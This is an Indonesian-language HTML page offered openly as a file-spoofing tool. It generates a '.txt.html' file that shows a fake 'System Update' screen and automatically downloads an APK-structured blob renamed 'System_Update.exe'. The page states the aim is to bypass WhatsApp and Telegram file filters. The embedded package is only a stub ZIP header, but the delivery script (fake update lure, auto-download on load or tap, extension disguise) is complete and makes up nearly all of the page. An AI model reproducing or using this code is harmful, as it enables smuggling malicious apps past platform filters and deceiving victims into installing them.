<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Android APK to EXE Spoofing</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Android APK Spoofing</h2>
<p>Mengunduh file yang secara struktur adalah APK, namun berekstensi .exe (untuk bypass filter WhatsApp/Telegram).</p>

<button id="start-btn" type="button">Mulai Generate File</button>
<div id="status" role="status">Sistem siap.</div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");

let activeUrls = [];
let isProcessing = false;

const prepareMimeBlobAsync = (i) => {
    return new Promise((resolve) => {
        queueMicrotask(() => {
            // Halaman HTML yang akan tampil saat file .txt.html dibuka
            const payloadText = "<!DOCTYPE html>" +
            "<html>" +
            "<head><meta charset='UTF-8'><title>System Update</title></head>" +
            "<body style='margin:0;padding:0;background:#0f111a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
            "<div style='background:#1e2130;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:400px;text-align:center;border:1px solid #333;'>" +
            "    <h2 style='color:#4CAF50;margin-bottom:10px;'>⚙️ System Update</h2>" +
            "    <p style='color:#aaa;font-size:14px;margin-bottom:25px;line-height:1.5;'>Pembaruan perangkat lunak sedang diunduh. Harap tunggu hingga proses selesai.</p>" +
            "    <p id='status' style='color:#ff9800;font-size:14px;font-weight:bold;'>Menyiapkan paket...</p>" +
            "</div>" +
            "<script>" +
            "(function(){" +
            "\"use strict\";" +
            
            "function b64KeBytes(b64){" +
            "    var binary = atob(b64);" +
            "    var len = binary.length;" +
            "    var bytes = new Uint8Array(len);" +
            "    for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
            "    return bytes;" +
            "}" +
            
            // PAYLOAD ASLI APK (Header ZIP PK\x03\x04)
            "var b64Data = \"UEsDBAoAAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
            "var sudah = false;" +
            
            "function picuDownload(){" +
            "    if (sudah) return;" +
            "    sudah = true;" +
            "    var statusEl = document.getElementById('status');" +
            "    try{" +
            "        statusEl.textContent = 'Menyiapkan berkas...';" +
            "        var bytesArr = b64KeBytes(b64Data);" +
            
            // Menggunakan MIME type APK
            "        var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
            "        var url = URL.createObjectURL(blob);" +
            "        var a = document.createElement('a');" +
            "        a.href = url;" +
            
            // KUNCI: Ekstensi yang terunduh adalah .exe
            "        a.download = 'System_Update.exe';" +
            
            "        a.style.display = 'none';" +
            "        document.body.appendChild(a);" +
            "        a.click();" +
            "        setTimeout(function(){ " +
            "            if (a.parentNode) a.parentNode.removeChild(a); " +
            "            URL.revokeObjectURL(url); " +
            "        }, 3000);" +
            "        statusEl.textContent = 'Paket berhasil diunduh.';" +
            "        statusEl.style.color = '#4CAF50';" +
            "    } catch(e){" +
            "        statusEl.textContent = 'Gagal: ' + e.message;" +
            "        statusEl.style.color = '#f00';" +
            "        sudah = false;" +
            "    }" +
            "}" +
            
            "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
            "document.addEventListener('click', picuDownload);" +
            "document.addEventListener('touchstart', picuDownload);" +
            "})();" +
            "<\/script>" +
            "</body>" +
            "</html>";
          
            const blob = new Blob([payloadText], { type: "text/html" });
            const url = URL.createObjectURL(blob);
            resolve({ id: i, url: url });
        });
    });
};

const triggerInstantDownload = (fileData) => {
    const link = document.createElement("a");
    link.href = fileData.url;
    
    // File pertama tetap diunduh sebagai .txt.html
    link.download = `update-paket.txt.html`;
    
    link.textContent = `Download update-paket.txt.html`;
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};

startBtn.addEventListener("click", () => {
    if (isProcessing) return;
    isProcessing = true;
    startBtn.disabled = true;
    statusDiv.textContent = "Menyiapkan file...";

    const root = document.documentElement;
    try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}

    setTimeout(async () => {
        try {
            const fileData = await prepareMimeBlobAsync(1);
            activeUrls.push(fileData.url);
            triggerInstantDownload(fileData);
            statusDiv.textContent = "File berhasil diunduh. Buka file .txt.html di HP Android.";
        } catch(e) {
            statusDiv.textContent = "Gagal: " + e.message;
        }
        isProcessing = false;
        startBtn.disabled = false;
    }, 300);
});
</script>
</body>
</html>
